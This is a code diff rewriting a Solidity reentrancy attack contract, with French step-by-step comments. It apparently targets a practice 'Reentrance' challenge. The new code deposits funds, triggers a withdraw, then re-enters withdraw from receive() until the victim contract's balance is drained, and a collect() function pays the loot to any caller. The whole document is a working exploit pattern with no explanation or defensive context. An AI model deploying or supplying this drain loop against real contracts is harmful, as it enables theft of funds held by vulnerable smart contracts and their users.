@@ -11,28 +11,33 @@ interface IReentrance {
 
 contract Reentrancy {
     IReentrance public reentrance;
-
-    uint8 public limit;
-    uint8 public count;
+    uint256 public storedAmount; // montant mémorisé entre les appels
 
     constructor(address _reentranceAddress) {
         reentrance = IReentrance(_reentranceAddress);
-        limit = 2;
-        count = 0;
     }
 
+    // Étape 1 : déposer pour obtenir un solde légitime
     function donate() external payable {
+        storedAmount = msg.value;
         reentrance.donate{value: msg.value}(address(this));
     }
 
-    function attack() external payable {
-        if (count < limit) {
-            count++;
-            reentrance.withdraw(msg.value);
+    // Étape 2 : déclencher le premier withdraw
+    function attack() external {
+        reentrance.withdraw(storedAmount);
+    }
+
+    // Étape 3 : boucle de réentrance
+    receive() external payable {
+        uint256 victimBalance = address(reentrance).balance;
+        if (victimBalance > 0) {
+            reentrance.withdraw(storedAmount);
         }
     }
 
-    receive() external payable {
-        this.attack();
+    function collect() external {
+        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
+        require(ok);
     }
 }
